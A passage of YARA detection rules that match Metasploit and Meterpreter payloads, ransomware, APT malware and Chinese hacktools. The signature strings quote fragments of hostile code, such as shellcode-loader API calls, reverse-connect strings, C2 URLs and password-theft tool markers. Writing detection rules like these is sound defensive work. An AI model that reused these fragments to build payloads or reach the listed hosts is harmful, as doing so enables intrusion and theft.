      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "7a6c66dfc998bf5838993e40026e1f400acd018bde8d4c01ef2e2e8fba507065"
      id = "030d1982-c9a8-539d-a995-7901ae425857"
   strings:
      $s1 = "required to install Foobar 1.0." fullword ascii
      $s2 = "Copyright 2009 The Apache Software Foundation." fullword wide
      $s3 = "{50F36D89-59A8-4A40-9689-8792029113AC}" fullword ascii
   condition:
      all of them
}

rule Msfpayloads_msf_7 {
   meta:
      description = "Metasploit Payloads - file msf.vba"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "425beff61a01e2f60773be3fcb74bdfc7c66099fe40b9209745029b3c19b5f2f"
      id = "8d1b742e-510a-5807-ad3f-f10cc325d292"
   strings:
      $s1 = "Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal" ascii
      $s2 = "= VirtualAlloc(0, UBound(Tsw), &H1000, &H40)" fullword ascii
      $s3 = "= RtlMoveMemory(" ascii
   condition:
      all of them
}

rule Msfpayloads_msf_8 {
   meta:
      description = "Metasploit Payloads - file msf.ps1"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "519717e01f0cb3f460ef88cd70c3de8c7f00fb7c564260bd2908e97d11fde87f"
      id = "54466663-12ef-5fa4-a13c-e80ddbc0f4f8"
   strings:
      $s1 = "[DllImport(\"kernel32.dll\")]" fullword ascii
      $s2 = "[DllImport(\"msvcrt.dll\")]" fullword ascii
      $s3 = "-Name \"Win32\" -namespace Win32Functions -passthru" fullword ascii
      $s4 = "::VirtualAlloc(0,[Math]::Max($" ascii
      $s5 = ".Length,0x1000),0x3000,0x40)" ascii
      $s6 = "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);" fullword ascii
      $s7 = "::memset([IntPtr]($" ascii
   condition:
      6 of them
}

rule Msfpayloads_msf_9 {
   meta:
      description = "Metasploit Payloads - file msf.war - contents"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "e408678042642a5d341e8042f476ee7cef253871ef1c9e289acf0ee9591d1e81"
      id = "488a2e97-ebc2-5ccf-ab5d-dfed4b534b52"
   strings:
      $s1 = "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1)" fullword ascii
      $s2 = ".concat(\".exe\");" fullword ascii
      $s3 = "[0] = \"chmod\";" ascii
      $s4 = "= Runtime.getRuntime().exec(" ascii
      $s5 = ", 16) & 0xff;" ascii

      $x1 = "4d5a9000030000000" ascii
   condition:
      4 of ($s*) or (
         uint32(0) == 0x61356434 and $x1 at 0
      )
}

rule Msfpayloads_msf_10 {
   meta:
      description = "Metasploit Payloads - file msf.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "3cd74fa28323c0d64f45507675ac08fb09bae4dd6b7e11f2832a4fbc70bb7082"
      id = "3bc3b66a-9f8a-55c2-ae2a-00faa778cef7"
   strings:
      $s1 = { 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff ac 3c 61 }
      $s2 = { 01 c7 38 e0 75 f6 03 7d f8 3b 7d 24 75 e4 58 8b }
      $s3 = { 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 5f 5f }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule Msfpayloads_msf_svc {
   meta:
      description = "Metasploit Payloads - file msf-svc.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "2b02c9c10577ee0c7590d3dadc525c494122747a628a7bf714879b8e94ae5ea1"
      id = "45d1c527-1f90-50f3-8e64-e77d69386b0a"
   strings:
      $s1 = "PAYLOAD:" fullword ascii
      $s2 = ".exehll" ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 50KB and all of them )
}

rule MAL_Metasploit_Framework_UA {
   meta:
      description = "Detects User Agent used in Metasploit Framework"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/rapid7/metasploit-framework/commit/12a6d67be48527f5d3987e40cac2a0cbb4ab6ce7"
      date = "2018-08-16"
      score = 65
      hash1 = "1743e1bd4176ffb62a1a0503a0d76033752f8bd34f6f09db85c2979c04bbdd29"
      id = "e5a18456-3a07-5b58-ad95-086152298a1f"
   strings:
      $s3 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and 1 of them
}

rule HKTL_Meterpreter_inMemory {
   meta:
      description = "Detects Meterpreter in-memory"
      author = "netbiosX, Florian Roth"
      reference = "https://www.reddit.com/r/purpleteamsec/comments/hjux11/meterpreter_memory_indicators_detection_tooling/"
      date = "2020-06-29"
      modified = "2023-04-21"
      score = 85
      id = "29c3bb7e-4da8-5924-ada7-2f28d9352009"
   strings: 
      $sxc1 = { 6D 65 74 73 72 76 2E 64 6C 6C 00 00 52 65 66 6C 
               65 63 74 69 76 65 4C 6F 61 64 65 72 }
      $sxs1 = "metsrv.x64.dll" ascii fullword
      $ss1 = "WS2_32.dll" ascii fullword
      $ss2 = "ReflectiveLoader" ascii fullword

      $fp1 = "SentinelOne" ascii wide
      $fp2 = "fortiESNAC" ascii wide
      $fp3 = "PSNMVHookMS" ascii wide
   condition: 
      ( 1 of ($sx*) or 2 of ($s*) )
      and not 1 of ($fp*)
}

rule WoolenGoldfish_Generic_3 {
	meta:
		description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://goo.gl/NpJpVZ"
		date = "2015/03/25"
		score = 90
		hash1 = "86222ef166474e53f1eb6d7e6701713834e6fee7"
		hash2 = "e8dbcde49c7f760165ebb0cb3452e4f1c24981f5"
		id = "5c227d24-624c-5fb5-a2ea-a971fda8bfba"
	strings:
		$x1 = "... get header FATAL ERROR !!!  %d bytes read > header_size" fullword ascii
		$x2 = "index.php?c=%S&r=%x&u=1&t=%S" fullword wide
		$x3 = "connect_back_tcp_channel#do_connect:: Error resolving connect back hostname" fullword ascii

		$s0 = "kernel32.dll GetProcAddressLoadLibraryAws2_32.dll" fullword ascii
		$s1 = "Content-Type: multipart/form-data; boundary=%S" fullword wide
		$s2 = "Attempting to unlock uninitialized lock!" fullword ascii
		$s4 = "unable to load kernel32.dll" fullword ascii
		$s5 = "index.php?c=%S&r=%x" fullword wide
		$s6 = "%s len:%d " fullword ascii
		$s7 = "Encountered error sending syscall response to client" fullword ascii
		$s9 = "/info.dat" fullword ascii
		$s10 = "Error entering thread lock" fullword ascii
		$s11 = "Error exiting thread lock" fullword ascii
		$s12 = "connect_back_tcp_channel_init:: socket() failed" fullword ascii
	condition:
		( 1 of ($x*) ) or
		( 8 of ($s*) )
}

rule MAL_RANSOM_Crime_DearCry_Mar2021_1 {
    meta:
        description = "Triggers on strings of known DearCry samples"
        author = "Nils Kuhnert"
        date = "2021-03-12"
        reference = "https://twitter.com/phillip_misner/status/1370197696280027136"
        hash1 = "2b9838da7edb0decd32b086e47a31e8f5733b5981ad8247a2f9508e232589bff"
        hash2 = "e044d9f2d0f1260c3f4a543a1e67f33fcac265be114a1b135fd575b860d2b8c6"
        hash3 = "feb3e6d30ba573ba23f3bd1291ca173b7879706d1fe039c34d53a4fdcdf33ede"
        id = "d9714502-f1ea-5fe8-b0ac-1f7a9a30d8f5"
    strings:
        $x1 = ".TIF .TIFF .PDF .XLS .XLSX .XLTM .PS .PPS .PPT .PPTX .DOC .DOCX .LOG .MSG .RTF .TEX .TXT .CAD .WPS .EML .INI .CSS .HTM .HTML  .XHTML .JS .JSP .PHP .KEYCHAIN .PEM .SQL .APK .APP .BAT .CGI .ASPX .CER .CFM .C .CPP .GO .CONFIG .PL .PY .DWG .XML .JPG .BMP .PNG .EXE .DLL .CAD .AVI .H.CSV .DAT .ISO .PST .PGD  .7Z .RAR .ZIP .ZIPX .TAR .PDB .BIN .DB .MDB .MDF .BAK .LOG .EDB .STM .DBF .ORA .GPG .EDB .MFS" ascii

        $s1 = "create rsa error" ascii fullword
        $s2 = "DEARCRY!" ascii fullword
        $s4 = "/readme.txt" ascii fullword
        $s5 = "msupdate" ascii fullword
        $s6 = "Your file has been encrypted!" ascii fullword
        $s7 = "%c:\\%s" ascii fullword
        $s8 = "C:\\Users\\john\\" ascii
        $s9 = "EncryptFile.exe.pdb" ascii
    condition:
        uint16(0) == 0x5a4d 
        and filesize > 1MB and filesize < 2MB 
        and ( 1 of ($x*) or 3 of them )
        or 5 of them
}

rule APT_Project_Sauron_Scripts {
	meta:
		description = "Detects scripts (mostly LUA) from Project Sauron report by Kaspersky"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://goo.gl/eFoP4A"
		date = "2016-08-08"
		id = "575a6f1b-5a4d-5f81-b44a-b7025dbec2a5"
	strings:
		$x1 = "local t = w.exec2str(\"regedit "
		$x2 = "local r = w.exec2str(\"cat"
		$x3 = "ap*.txt link*.txt node*.tun VirtualEncryptedNetwork.licence"
		$x4 = "move O FakeVirtualEncryptedNetwork.dll"
		$x5 = "sinfo | basex b 32url | dext l 30"
		$x6 = "w.exec2str(execStr)"
		$x7 = "netnfo irc | basex b 32url"
		$x8 = "w.exec(\"wfw status\")"
		$x9 = "exec(\"samdump\")"
		$x10 = "cat VirtualEncryptedNetwork.ini|grep"
		$x11 = "if string.lower(k) == \"securityproviders\" then"
		$x12 = "exec2str(\"plist b | grep netsvcs\")"
		$x14 = "SAURON_KBLOG_KEY ="
	condition:
		1 of them
}

rule apt_regin_hopscotch {
	meta:
	    copyright = "Kaspersky Lab"
	    description = "Rule to detect Regin's Hopscotch module"
	    version = "1.0"
	    last_modified = "2015-01-22"
		modified = "2023-01-27"
	    reference = "https://securelist.com/blog/research/68438/an-analysis-of-regins-hopscotch-and-legspin/"
	    md5 = "6c34031d7a5fc2b091b623981a8ae61c"
	    id = "907042ba-8e64-5ca7-9a83-70c28af1ab99"
	strings:
	    $a1="AuthenticateNetUseIpc"
	    $a2="Failed to authenticate to"
	    $a3="Failed to disconnect from"
	    $a4="%S\\ipc$" wide
	    $a5="Not deleting..."
	    $a6="CopyServiceToRemoteMachine"
	    $a7="DH Exchange failed"
	    $a8="ConnectToNamedPipes"
	condition:
	    uint16(0) == 0x5A4D  and all of ($a*)
}

rule MAL_RANSOM_COVID19_Apr20_1 {
   meta:
      description = "Detects ransomware distributed in COVID-19 theme"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://unit42.paloaltonetworks.com/covid-19-themed-cyber-attacks-target-government-and-medical-organizations/"
      date = "2020-04-15"
      hash1 = "2779863a173ff975148cb3156ee593cb5719a0ab238ea7c9e0b0ca3b5a4a9326"
      id = "fc723d1f-e969-5af6-af57-70d00bf797f4"
   strings:
      $s1 = "/savekey.php" wide

      $op1 = { 3f ff ff ff ff ff 0b b4 }
      $op2 = { 60 2e 2e 2e af 34 34 34 b8 34 34 34 b8 34 34 34 }
      $op3 = { 1f 07 1a 37 85 05 05 36 83 05 05 36 83 05 05 34 }
   condition:
      uint16(0) == 0x5a4d and
      filesize < 700KB and
      2 of them
}

rule gen_exploit_CVE_2017_10271_WebLogic : HIGHVOL
{
    meta: 
        description = "Exploit for CVE-2017-10271 (Oracle WebLogic)"
        author = "John Lambert @JohnLaTwC"
        date = "2018-03-21"
        hash1 = "376c2bc11d4c366ad4f6fecffc0bea8b195e680b4c52a48d85a8d3f9fab01c95"
        hash2 = "7d5819a2ea62376e24f0dd3cf5466d97bbbf4f5f730eb9302307154b363967ea"
        hash3 = "864e9d8904941fae90ddd10eb03d998f85707dc2faff80cba2e365a64e830e1d/subfile"
        hash4 = "2a69e46094d0fef2b3ffcab73086c16a10b517f58e0c1f743ece4f246889962b"
        reference = "https://github.com/c0mmand3rOpSec/CVE-2017-10271, https://www.fireeye.com/blog/threat-research/2018/02/cve-2017-10271-used-to-deliver-cryptominers.html"
        id = "e30e316f-1ebb-5c38-ba25-d2a9d0083a03"
    strings:
        $s1 = "<soapenv:Header"
        $s2 = "java.beans.XMLDecoder"
        $s3 = "void" fullword
        $s4 = "index="
        $s5 = "/array>"
        $s6 = "\"start\""
        $s7 = "work:WorkContext" nocase

    condition:
        filesize < 10KB
        and (uint32(0) == 0x616f733c or uint32(0) == 0x54534f50)  //'<soa' or 'POST'
        and all of ($s*)
}

rule CookieTools {
	meta:
		description = "Chinese Hacktool Set - file CookieTools.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b6a3727fe3d214f4fb03aa43fb2bc6fadc42c8be"
		id = "893884e5-6f4c-5f67-9382-8bf1ee45a257"
	strings:
		$s0 = "http://210.73.64.88/doorway/cgi-bin/getclientip.asp?IP=" fullword ascii
		$s2 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
		$s3 = "Connection Closed Gracefully.;Could not bind socket. Address and port are alread" wide
		$s8 = "OnGetPasswordP" fullword ascii
		$s12 = "http://www.chinesehack.org/" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 5000KB and 4 of them
}

rule HKTL_CN_Dos_GetPass {
	meta:
		description = "Chinese Hacktool Set - file GetPass.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		modified = "2023-01-06"
		old_rule_name = "Dos_GetPass"
		hash = "d18d952b24110b83abd17e042f9deee679de6a1a"
		id = "08635096-474c-5fdf-825e-6c7c8c8d4061"
	strings:
		$s0 = "GetLogonS" ascii
		$s3 = "/showthread.php?t=156643" ascii
		$s8 = "To Run As Administ" ascii
		$s18 = "EnableDebugPrivileg" fullword ascii
		$s19 = "sedebugnameValue" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 890KB and all of them
}

rule Sword1_5 {
	meta:
		description = "Chinese Hacktool Set - file Sword1.5.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "96ee5c98e982aa8ed92cb4cedb85c7fda873740f"
		id = "dff8666a-0373-5605-9012-92b2b3ec71ea"
	strings:
		$s3 = "http://www.ip138.com/ip2city.asp" fullword wide
		$s4 = "http://www.md5decrypter.co.uk/feed/api.aspx?" fullword wide
		$s6 = "ListBox_Command" fullword wide
		$s13 = "md=7fef6171469e80d32c0559f88b377245&submit=MD5+Crack" fullword wide
		$s18 = "\\Set.ini" wide
		$s19 = "OpenFileDialog1" fullword wide
		$s20 = " (*.txt)|*.txt" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 400KB and 4 of them
}

rule CookieTools2 {
	meta:
		description = "Chinese Hacktool Set - file CookieTools2.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "cb67797f229fdb92360319e01277e1345305eb82"
		id = "f227ba4b-9cad-5aac-99ab-46a8237249d4"
	strings:
		$s1 = "www.gxgl.com&www.gxgl.net" fullword wide
		$s2 = "ip.asp?IP=" fullword ascii
		$s3 = "MSIE 5.5;" fullword ascii
		$s4 = "SOFTWARE\\Borland\\" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 700KB and all of them
}

rule unknown2 {
	meta:
		description = "Chinese Hacktool Set - file unknown2.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "32508d75c3d95e045ddc82cb829281a288bd5aa3"
		id = "af7ddcbf-1cba-51a9-b435-9a267320f502"
	strings:
		$s1 = "http://md5.com.cn/index.php/md5reverse/index/md/" wide
		$s2 = "http://www.md5decrypter.co.uk/feed/api.aspx?" wide
		$s3 = "http://www.md5.com.cn" fullword wide
		$s4 = "1.5.exe" fullword wide
		$s5 = "\\Set.ini" wide
		$s6 = "OpenFileDialog1" fullword wide
		$s7 = " (*.txt)|*.txt" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and 4 of them
}

rule CoreImpact_sysdll_exe {
   meta:
      description = "Detects a malware sysdll.exe from the Rocket Kitten APT"
      author = "Florian Roth (Nextron Systems)"
      score = 70
      date = "27.12.2014"
      modified = "2023-01-06"
      hash = "f89a4d4ae5cca6d69a5256c96111e707"
      id = "bac55c00-5d14-59ca-8597-f52b4577be0c"
   strings:
      $s0 = "d:\\nightly\\sandbox_avg10_vc9_SP1_2011\\source\\avg10\\avg9_all_vs90\\bin\\Rele" ascii

      $s1 = "Mozilla/5.0" fullword ascii
      $s3 = "index.php?c=%s&r=%lx" fullword ascii
      $s4 = "index.php?c=%s&r=%x" fullword ascii
      $s5 = "127.0.0.1" fullword ascii
      $s6 = "/info.dat" ascii
      $s7 = "needroot" fullword ascii
      $s8 = "./plugins/" ascii
   condition:
      $s0 or 6 of them
}

rule Casper_Backdoor_x86 {
   meta:
      description = "Casper French Espionage Malware - Win32/ProxyBot.B - x86 Payload http://goo.gl/VRJNLo"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://goo.gl/VRJNLo"
      date = "2015-03-05"
      modified = "2023-01-27"
      hash = "f4c39eddef1c7d99283c7303c1835e99d8e498b0"
      score = 80
      id = "9e54f00c-74a7-56cc-87e5-8dec1233cbb5"
   strings:
      $s1 = "\"svchost.exe\"" fullword wide
      $s2 = "firefox.exe" fullword ascii
      $s3 = "\"Host Process for Windows Services\"" fullword wide

      $x1 = "\\Users\\*" ascii
      $x2 = "\\Roaming\\Mozilla\\Firefox\\Profiles\\*" ascii
      $x3 = "\\Mozilla\\Firefox\\Profiles\\*" ascii
      $x4 = "\\Documents and Settings\\*" ascii

      $y1 = "%s; %S=%S" fullword wide
      $y2 = "%s; %s=%s" fullword ascii
      $y3 = "Cookie: %s=%s" fullword ascii
      $y4 = "http://%S:%d" fullword wide

      $z1 = "http://google.com/" ascii
      $z2 = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALC)" fullword ascii
      $z3 = "Operating System\"" fullword wide
   condition:
      ( filesize < 250KB and all of ($s*) ) or
      ( 3 of ($x*) and 2 of ($y*) and 2 of ($z*) )
}

rule RAT_SpyGate
{
	meta:
		author = "Kevin Breen <kevin@techanarchy.net>"
		date = "01.04.2014"
		description = "Detects SpyGate RAT"
		reference = "http://malwareconfig.com/stats/SpyGate"
		maltype = "Remote Access Trojan"
		filetype = "exe"

		id = "ed015770-81ff-5d9c-8bd0-3c225e400724"
	strings:
		$split = "abccba"
		$a1 = "abccbaSpyGateRATabccba" //$a = Version 0.2.6
		$a2 = "StubX.pdb"
		$a3 = "abccbaDanabccb"
		$b1 = "monikerString" nocase //$b = Version 2.0
		$b2 = "virustotal1"
		$b3 = "get_CurrentDomain"
		$c1 = "shutdowncomputer" wide //$c = Version 2.9
		$c2 = "shutdown -r -t 00" wide
		$c3 = "set cdaudio door closed" wide
		$c4 = "FileManagerSplit" wide
		$c5 = "Chating With >> [~Hacker~]" wide

	condition:
		(all of ($a*) and #split > 40) or (all of ($b*) and #split > 10) or (all of ($c*))
}

rule PAS_TOOL_PHP_WEB_KIT_mod {
   meta:
      description = "Detects PAS Tool PHP Web Kit"
      reference = "https://www.us-cert.gov/security-publications/GRIZZLY-STEPPE-Russian-Malicious-Cyber-Activity"
      author = "US CERT - modified by Florian Roth due to performance reasons"
      date = "2016/12/29"
      id = "6bc75e44-7784-5e48-9bbc-052d84ebee83"
   strings:
      $php = "<?php"
      $base64decode1 = "='base'.("
      $strreplace = "str_replace(\"\\n\", ''"
      $md5 = ".substr(md5(strrev("
      $gzinflate = "gzinflate"
      $cookie = "_COOKIE"
      $isset = "isset"
   condition:
      uint32(0) == 0x68703f3c and
      $php at 0 and
      (filesize > 10KB and filesize < 30KB) and
      #cookie == 2 and
      #isset == 3 and
      all of them
}

rule CN_Honker_mysql_injectV1_1_Creak {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file mysql_injectV1.1_Creak.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "a1f066789f48a76023598c5777752c15f91b76b0"
		id = "39025a57-557a-53c0-bfdb-81fe83f824af"
	strings:
		$s0 = "1http://192.169.200.200:2217/mysql_inject.php?id=1" fullword ascii /* PEStudio Blacklist: strings */
		$s12 = "OnGetPassword" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		uint16(0) == 0x5a4d and filesize < 5890KB and all of them
}

rule CN_Honker_SegmentWeapon {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file SegmentWeapon.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "494ef20067a7ce2cc95260e4abc16fcfa7177fdf"
		id = "e1b6f721-4c4d-50f2-9ed6-f38e8e7ea4ab"
	strings:
		$s0 = "C:\\WINDOWS\\system32\\msvbvm60.dll\\3" fullword ascii /* PEStudio Blacklist: strings */
		$s1 = "http://www.nforange.com/inc/1.asp?" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and all of them
}

rule CN_Honker_Md5CrackTools {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Md5CrackTools.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "9dfd9c9923ae6f6fe4cbfa9eb69688269285939c"
		id = "16e04a66-0f6f-5b94-97c3-df62aa9406a9"
	strings:
		$s1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii /* PEStudio Blacklist: agent */
		$s2 = ",<a href='index.php?c=1&type=md5&hash=" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 4580KB and all of them
}

rule CN_Honker_Oracle_v1_0_Oracle {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Oracle.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "0264f4efdba09eaf1e681220ba96de8498ab3580"
		id = "0cebede9-f4ff-5efb-98bc-55df0ad656a3"
	strings:
		$s1 = "!http://localhost/index.asp?id=zhr" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "OnGetPassword" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "Mozilla/3.0 (compatible; Indy Library)" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		uint16(0) == 0x5a4d and filesize < 3455KB and all of them
}

rule CN_Honker_ManualInjection {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file ManualInjection.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "e83d427f44783088a84e9c231c6816c214434526"
		id = "f0899003-824f-56ed-b653-9f7a77b9ec6a"
	strings:
		$s0 = "http://127.0.0.1/cookie.asp?fuck=" fullword ascii /* PEStudio Blacklist: strings */
		$s16 = "http://Www.cnhuker.com | http://www.0855.tv" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule CN_Honker_PostgreSQL {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file PostgreSQL.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "1ecfaa91aae579cfccb8b7a8607176c82ec726f4"
		id = "ae90d03c-ef67-5ece-81ae-86947196a81c"
	strings:
		$s1 = "&http://192.168.16.186/details.php?id=1" fullword ascii
		$s2 = "PostgreSQL_inject" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}

rule CN_Honker_Master_beta_1_7 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Master_beta_1.7.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "3be7a370791f29be89acccf3f2608fd165e8059e"
		id = "78f904ec-f7cb-5fd0-a117-925ebedd1d3e"
	strings:
		$s1 = "http://seo.chinaz.com/?host=" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "Location: getpass.asp?info=" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 312KB and all of them
}

rule CN_Honker_wwwscan_gui {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file wwwscan_gui.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "897b66a34c58621190cb88e9b2a2a90bf9b71a53"
		id = "fffed806-4394-505a-96bd-50bf6f24aefc"
	strings:
		$s1 = "%s www.target.com -p 8080 -m 10 -t 16" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "/eye2007Admin_login.aspx" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		uint16(0) == 0x5a4d and filesize < 280KB and all of them
}

rule CN_Honker_Injection {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Injection.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "3484ed16e6f9e0d603cbc5cb44e46b8b7e775d35"
		id = "8600c86f-0da1-5ddb-bae5-69358cf53e7c"
	strings:
		$s0 = "http://127.0.0.1/6kbbs/bank.asp" fullword ascii /* PEStudio Blacklist: strings */
		$s7 = "jmPost.asp" fullword wide /* PEStudio Blacklist: strings */
	condition:
		uint16(0) == 0x5a4d and filesize < 220KB and all of them
}

rule CN_Honker_SQLServer_inject_Creaked {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file SQLServer_inject_Creaked.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "af3c41756ec8768483a4cf59b2e639994426e2c2"
		id = "9a8a77c2-9e06-5694-8055-4480ab932520"
	strings:
		$s1 = "http://localhost/index.asp?id=2" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "Email:zhaoxypass@yahoo.com.cn<br>" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		uint16(0) == 0x5a4d and filesize < 8110KB and all of them
}

rule ScanBox_Malware_Generic {
	meta:
		description = "Scanbox Chinese Deep Panda APT Malware http://goo.gl/MUUfjv and http://goo.gl/WXUQcP"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference1 = "http://goo.gl/MUUfjv"
		reference2 = "http://goo.gl/WXUQcP"
		date = "2015/02/28"
		hash1 = "8d168092d5601ebbaed24ec3caeef7454c48cf21366cd76560755eb33aff89e9"
		hash2 = "d4be6c9117db9de21138ae26d1d0c3cfb38fd7a19fa07c828731fa2ac756ef8d"
		hash3 = "3fe208273288fc4d8db1bf20078d550e321d9bc5b9ab80c93d79d2cb05cbf8c2"
		id = "f7867e65-567f-530f-83d4-b5126021e523"
	strings:
		/* Sample 1 */
		$s0 = "http://142.91.76.134/p.dat" fullword ascii
		$s1 = "HttpDump 1.1" fullword ascii

		/* Sample 2 */
		$s3 = "SecureInput .exe" fullword wide
		$s4 = "http://extcitrix.we11point.com/vpn/index.php?ref=1" fullword ascii

		/* Sample 3 */
		$s5 = "%SystemRoot%\\System32\\svchost.exe -k msupdate" fullword ascii
		$s6 = "ServiceMaix" fullword ascii

		/* Certificate and Keywords */
		$x1 = "Management Support Team1" fullword ascii
		$x2 = "DTOPTOOLZ Co.,Ltd.0" fullword ascii
